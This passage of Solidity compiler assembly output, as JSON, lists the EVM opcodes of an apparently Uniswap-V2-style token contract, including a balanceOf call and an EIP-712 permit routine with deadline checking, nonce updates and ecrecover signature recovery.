											"end": 4,
											"name": "tag",
											"value": "273"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "MLOAD"
										},
										{
											"begin": 18289,
											"end": 18329,
											"name": "SWAP1"
										},
										{
											"begin": 18289,
											"end": 18343,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 18289,
											"end": 18333,
											"name": "PUSH [tag]",
											"value": "177"
										},
										{
											"begin": 18289,
											"end": 18343,
											"name": "AND"
										},
										{
											"begin": 18289,
											"end": 18343,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 18289,
											"end": 18343,
											"name": "tag",
											"value": "270"
										},
										{
											"begin": 18289,
											"end": 18343,
											"name": "JUMPDEST"
										},
										{
											"begin": 18225,
											"end": 18238,
											"name": "PUSH [tag]",
											"value": "149"
										},
										{
											"begin": 18225,
											"end": 18353,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 18225,
											"end": 18353,
											"name": "tag",
											"value": "269"
										},
										{
											"begin": 18225,
											"end": 18353,
											"name": "JUMPDEST"
										},
										{
											"begin": 18472,
											"end": 18480,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 18472,
											"end": 18480,
											"name": "SLOAD"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "DUP1"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "DUP2"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "MSTORE"
										},
										{
											"begin": 18461,
											"end": 18465,
											"name": "ADDRESS"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "DUP3"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "ADD"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "MSTORE"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "SWAP1"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "MLOAD"
										},
										{
											"begin": 18363,
											"end": 18491,
											"name": "PUSH [tag]",
											"value": "274"
										},
										{
											"begin": 18363,
											"end": 18491,
											"name": "SWAP3"
										},
										{
											"begin": 18390,
											"end": 18397,
											"name": "DUP5"
										},
										{
											"begin": 18390,
											"end": 18397,
											"name": "SWAP3"
										},
										{
											"begin": 18411,
											"end": 18413,
											"name": "DUP8"
										},
										{
											"begin": 18411,
											"end": 18413,
											"name": "SWAP3"
										},
										{
											"begin": 18427,
											"end": 18481,
											"name": "PUSH [tag]",
											"value": "270"
										},
										{
											"begin": 18427,
											"end": 18481,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18472,
											"end": 18480,
											"name": "SWAP1"
										},
										{
											"begin": 18472,
											"end": 18480,
											"name": "DIV"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18472,
											"end": 18480,
											"name": "AND"
										},
										{
											"begin": 18472,
											"end": 18480,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18427,
											"end": 18452,
											"name": "DUP7"
										},
										{
											"begin": 18427,
											"end": 18452,
											"name": "AND"
										},
										{
											"begin": 18427,
											"end": 18452,
											"name": "SWAP2"
										},
										{
											"begin": 18427,
											"end": 18452,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 18427,
											"end": 18452,
											"name": "SWAP2"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "DUP1"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "DUP3"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "ADD"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "SWAP3"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "SWAP3"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "SWAP1"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "SWAP2"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "SWAP1"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "DUP3"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "SWAP1"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "SUB"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "ADD"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "DUP2"
										},
										{
											"begin": 18427,
											"end": 18452,
											"name": "DUP7"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "DUP1"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 18427,
											"end": 18467,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "271"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 18363,
											"end": 18491,
											"name": "tag",
											"value": "274"
										},
										{
											"begin": 18363,
											"end": 18491,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1292,
											"end": 1293,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1281,
											"end": 1289,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1281,
											"end": 1293,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 18077,
											"end": 18498,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "tag",
											"value": "119"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "JUMPDEST"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "AND"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "DUP2"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "tag",
											"value": "121"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "JUMPDEST"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "AND"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "DUP2"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "tag",
											"value": "124"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMPDEST"
										},
										{
											"begin": 3688,
											"end": 3703,
											"name": "TIMESTAMP"
										},
										{
											"begin": 3676,
											"end": 3684,
											"name": "DUP5"
										},
										{
											"begin": 3676,
											"end": 3703,
											"name": "LT"
										},
										{
											"begin": 3676,
											"end": 3703,
											"name": "ISZERO"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH [tag]",
											"value": "280"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "JUMPI"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP2"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP3"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP3"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E8811561412549151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "82"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP3"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MLOAD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP2"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SUB"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "REVERT"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "tag",
											"value": "280"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "JUMPDEST"
										},
										{
											"begin": 3836,
											"end": 3852,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3836,
											"end": 3852,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP10"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "AND"
										},
										{
											"begin": 3734,
											"end": 3748,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP2"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP2"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "MSTORE"
										},
										{
											"begin": 4073,
											"end": 4079,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "SWAP1"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP2"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "MSTORE"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP4"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "KECCAK256"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SLOAD"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP3"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "ADD"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SWAP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SWAP3"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP3"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MLOAD"
										},
										{
											"begin": 706,
											"end": 772,
											"name": "PUSH",
											"value": "6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP2"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP5"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP14"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "AND"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP13"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "C0"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP12"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP2"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP7"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP2"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP3"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "DUP1"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "MLOAD"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "SWAP1"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "DUP4"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "ADD"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "KECCAK256"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1901"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "F0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "102"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP6"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "122"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP6"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP6"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP7"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP7"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "142"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP5"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP3"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "DUP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "MLOAD"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "DUP4"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP1"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "KECCAK256"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP6"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP4"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "162"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP5"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP7"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP10"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "AND"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "182"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP6"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "1A2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP5"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP9"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "1C2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP5"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP8"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MLOAD"
										},
										{
											"begin": 3734,
											"end": 3748,
											"name": "SWAP2"
										},
										{
											"begin": 3734,
											"end": 3748,
											"name": "SWAP4"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SWAP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "1E2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SUB"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP6"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "GAS"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "STATICCALL"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "281"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "281"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MLOAD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "DUP2"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "AND"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "ISZERO"
										},
										{
